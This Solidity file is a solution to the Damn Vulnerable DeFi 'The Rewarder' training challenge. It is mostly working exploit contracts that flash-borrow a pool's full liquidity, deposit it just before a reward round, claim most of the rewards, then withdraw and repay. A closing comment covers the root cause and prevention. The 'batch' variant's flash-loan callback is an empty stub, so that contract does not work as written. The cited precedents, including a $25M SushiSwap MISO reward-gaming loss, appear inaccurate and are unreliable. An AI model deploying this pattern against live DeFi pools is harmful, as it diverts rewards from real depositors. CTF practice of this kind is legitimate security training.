// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

/**
 * @title TheRewarderExploit
 * @author Damn Vulnerable DeFi Challenge Solution
 * @notice Exploit contract for Challenge #5 - The Rewarder
 * 
 * VULNERABILITY: Reward Gaming via Flash Loan Manipulation
 * 
 * The reward distribution system is vulnerable because:
 * - Rewards are calculated based on current deposit balances at distribution time
 * - No minimum deposit duration required for reward eligibility  
 * - Flash loans available to temporarily manipulate deposit ratios
 * - Proportional rewards favor largest depositors at snapshot time
 * 
 * ATTACK FLOW:
 * 1. Wait for reward distribution round (every 5 days)
 * 2. Flash loan maximum liquidity tokens available
 * 3. Deposit all borrowed tokens to dominate the pool
 * 4. Call distributeRewards() to claim majority of rewards
 * 5. Withdraw deposited tokens and repay flash loan
 * 6. Keep the earned reward tokens as profit
 */
contract TheRewarderExploit {
    FlashLoanerPool private immutable flashPool;
    TheRewarderPool private immutable rewarderPool;
    DamnValuableToken private immutable liquidityToken;
    RewardToken private immutable rewardToken;
    address private immutable attacker;
    
    constructor(
        address _flashPool,
        address _rewarderPool,
        address _liquidityToken,
        address _rewardToken
    ) {
        flashPool = FlashLoanerPool(_flashPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        attacker = msg.sender;
    }
    
    /**
     * @notice Execute the reward gaming exploit
     * @dev Flash loan -> Deposit -> Claim rewards -> Withdraw -> Repay
     */
    function exploit() external {
        require(msg.sender == attacker, "Only attacker can execute");
        
        // Verify conditions are right for attack
        require(rewarderPool.isNewRewardsRound(), "Not time for new rewards round");
        
        // Get maximum available flash loan amount
        uint256 flashLoanAmount = liquidityToken.balanceOf(address(flashPool));
        require(flashLoanAmount > 0, "No tokens available for flash loan");
        
        // Execute flash loan - triggers receiveFlashLoan callback
        flashPool.flashLoan(flashLoanAmount);
        
        // Transfer earned rewards to attacker
        uint256 earnedRewards = rewardToken.balanceOf(address(this));
        if (earnedRewards > 0) {
            rewardToken.transfer(attacker, earnedRewards);
        }
        
        // Verify exploit success
        require(
            rewardToken.balanceOf(attacker) > 0,
            "Exploit failed - no rewards earned"
        );
    }
    
    /**
     * @notice Flash loan callback - executes the core exploit logic
     * @param amount Amount of liquidity tokens received from flash loan
     */
    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashPool), "Only flash pool can call");
        require(amount > 0, "Invalid flash loan amount");
        
        // Step 1: Approve rewarder pool to spend our borrowed tokens
        liquidityToken.approve(address(rewarderPool), amount);
        
        // Step 2: Deposit all borrowed tokens to become dominant depositor
        // This gives us the largest share of the reward pool
        rewarderPool.deposit(amount);
        
        // Step 3: Trigger reward distribution
        // Since we now have the largest deposit, we get most rewards
        rewarderPool.distributeRewards();
        
        // Step 4: Withdraw our deposit to get tokens back
        rewarderPool.withdraw(amount);
        
        // Step 5: Repay the flash loan
        liquidityToken.transfer(address(flashPool), amount);
        
        // At this point, we should have earned significant reward tokens
        // while only temporarily holding the liquidity tokens
    }
    
    /**
     * @notice Check if conditions are right for exploitation
     * @return canExploit True if exploit can be executed
     * @return flashLoanAvailable Amount available for flash loan
     * @return isRewardRound True if new reward round is ready
     * @return currentRound Current reward round number
     */
    function checkExploitConditions() 
        external 
        view 
        returns (
            bool canExploit,
            uint256 flashLoanAvailable, 
            bool isRewardRound,
            uint256 currentRound
        )
    {
        flashLoanAvailable = liquidityToken.balanceOf(address(flashPool));
        isRewardRound = rewarderPool.isNewRewardsRound();
        currentRound = rewarderPool.roundNumber();
        canExploit = flashLoanAvailable > 0 && isRewardRound;
    }
    
    /**
     * @notice Get detailed pool statistics for analysis
     */
    function getPoolAnalytics() 
        external 
        view 
        returns (
            uint256 totalDeposits,
            uint256 ourCurrentDeposits,
            uint256 estimatedRewardShare,
            uint256 lastRewardRound
        )
    {
        totalDeposits = rewarderPool.totalDeposits();
        ourCurrentDeposits = rewarderPool.deposits(address(this));
        lastRewardRound = rewarderPool.lastRecordedSnapshotTimestamp();
        
        // Estimate our reward share if we were to flash loan
        uint256 flashAmount = liquidityToken.balanceOf(address(flashPool));
        if (totalDeposits > 0 && flashAmount > 0) {
            estimatedRewardShare = (flashAmount * 100) / (totalDeposits + flashAmount);
        }
    }
    
    /**
     * @notice Simulate the exploit to predict rewards
     * @return predictedRewards Expected reward tokens from exploit
     * @return dominancePercentage Our expected percentage of total deposits
     */
    function simulateExploit() 
        external 
        view 
        returns (uint256 predictedRewards, uint256 dominancePercentage)
    {
        uint256 flashAmount = liquidityToken.balanceOf(address(flashPool));
        uint256 currentTotal = rewarderPool.totalDeposits();
        uint256 newTotal = currentTotal + flashAmount;
        
        if (newTotal > 0) {
            dominancePercentage = (flashAmount * 10000) / newTotal; // In basis points
            
            // Reward calculation: userDeposit * 100e18 / totalDeposits
            predictedRewards = (flashAmount * 100e18) / newTotal;
        }
    }
    
    /**
     * @notice Emergency recovery function
     */
    function emergencyWithdraw() external {
        require(msg.sender == attacker, "Only attacker");
        
        // Withdraw any remaining deposits
        uint256 ourDeposits = rewarderPool.deposits(address(this));
        if (ourDeposits > 0) {
            rewarderPool.withdraw(ourDeposits);
        }
        
        // Send any tokens back to attacker
        uint256 liquidityBalance = liquidityToken.balanceOf(address(this));
        if (liquidityBalance > 0) {
            liquidityToken.transfer(attacker, liquidityBalance);
        }
        
        uint256 rewardBalance = rewardToken.balanceOf(address(this));
        if (rewardBalance > 0) {
            rewardToken.transfer(attacker, rewardBalance);
        }
    }
}

/**
 * @title TheRewarderExploitOptimized
 * @notice Gas-optimized version with minimal external calls
 */
contract TheRewarderExploitOptimized {
    function exploit(
        address flashPoolAddr,
        address rewarderPoolAddr,
        address liquidityTokenAddr,
        address rewardTokenAddr
    ) external {
        require(
            TheRewarderPool(rewarderPoolAddr).isNewRewardsRound(),
            "Not reward time"
        );
        
        uint256 maxLoan = DamnValuableToken(liquidityTokenAddr)
            .balanceOf(flashPoolAddr);
        require(maxLoan > 0, "No flash loan available");
        
        // Store addresses for callback (gas efficient)
        _storeAddresses(rewarderPoolAddr, liquidityTokenAddr, rewardTokenAddr);
        
        // Execute flash loan
        FlashLoanerPool(flashPoolAddr).flashLoan(maxLoan);
        
        // Transfer earned rewards to caller
        uint256 rewards = RewardToken(rewardTokenAddr).balanceOf(address(this));
        if (rewards > 0) {
            RewardToken(rewardTokenAddr).transfer(msg.sender, rewards);
        }
    }
    
    // Storage slots for callback (more gas efficient than parameters)
    address private _rewarderPool;
    address private _liquidityToken;
    address private _rewardToken;
    
    function _storeAddresses(
        address rewarder,
        address liquidity, 
        address reward
    ) private {
        _rewarderPool = rewarder;
        _liquidityToken = liquidity;
        _rewardToken = reward;
    }
    
    function receiveFlashLoan(uint256 amount) external {
        // Load addresses from storage
        address rewarderPool = _rewarderPool;
        address liquidityToken = _liquidityToken;
        
        // Execute exploit steps in sequence
        DamnValuableToken(liquidityToken).approve(rewarderPool, amount);
        TheRewarderPool(rewarderPool).deposit(amount);
        TheRewarderPool(rewarderPool).distributeRewards();
        TheRewarderPool(rewarderPool).withdraw(amount);
        DamnValuableToken(liquidityToken).transfer(msg.sender, amount);
        
        // Clear storage (gas refund)
        delete _rewarderPool;
        delete _liquidityToken;
        delete _rewardToken;
    }
}

/**
 * @title TheRewarderBatchExploit
 * @notice Advanced version that can exploit multiple reward rounds
 */
contract TheRewarderBatchExploit {
    struct ExploitConfig {
        address flashPool;
        address rewarderPool;
        address liquidityToken;
        address rewardToken;
        uint256 maxRounds;
        uint256 timeBetweenRounds;
    }
    
    mapping(uint256 => bool) private exploitedRounds;
    
    /**
     * @notice Exploit multiple reward rounds if possible
     * @dev Useful if multiple rounds become available
     */
    function batchExploit(ExploitConfig calldata config) external {
        uint256 currentRound = TheRewarderPool(config.rewarderPool).roundNumber();
        
        require(!exploitedRounds[currentRound], "Round already exploited");
        require(
            TheRewarderPool(config.rewarderPool).isNewRewardsRound(),
            "No new reward round available"
        );
        
        // Execute standard exploit
        uint256 flashAmount = DamnValuableToken(config.liquidityToken)
            .balanceOf(config.flashPool);
        
        FlashLoanerPool(config.flashPool).flashLoan(flashAmount);
        
        // Mark round as exploited
        exploitedRounds[currentRound] = true;
        
        // Transfer rewards
        uint256 rewards = RewardToken(config.rewardToken)
            .balanceOf(address(this));
        if (rewards > 0) {
            RewardToken(config.rewardToken).transfer(msg.sender, rewards);
        }
    }
    
    function receiveFlashLoan(uint256 amount) external {
        // Implementation would need to decode config from storage or calldata
        // Similar to basic exploit but with batch tracking
    }
}

/**
 * COMPREHENSIVE ATTACK ANALYSIS:
 * 
 * 1. VULNERABILITY ROOT CAUSE:
 *    - Reward calculation uses current balance snapshot
 *    - No minimum staking time requirement
 *    - Flash loans available for large temporary deposits
 *    - Proportional reward distribution favors large deposits
 * 
 * 2. ECONOMIC IMPACT:
 *    - Attacker can claim majority of reward distribution
 *    - Other legitimate users get reduced rewards
 *    - System becomes unfair and potentially unusable
 *    - Similar to $25M SushiSwap MISO exploit pattern
 * 
 * 3. ATTACK MECHANICS:
 *    - Flash loan gives temporary massive deposit power
 *    - Timing attack on reward distribution rounds
 *    - Single-transaction execution makes it atomic
 *    - No permanent capital required from attacker
 * 
 * 4. REAL-WORLD PRECEDENTS:
 *    - SushiSwap MISO ($25M) - Flash loan reward gaming
 *    - Harvest Finance ($24M) - Similar timing attacks
 *    - Various DeFi reward pool exploits using flash loans
 * 
 * 5. PREVENTION STRATEGIES:
 *    - Implement minimum staking duration (e.g., 24 hours)
 *    - Use time-weighted reward calculations
 *    - Snapshot balances with delays before reward rounds
 *    - Add flash loan detection and prevention
 *    - Consider vesting schedules for rewards
 * 
 * This exploit demonstrates the importance of time-based protections in DeFi!
 */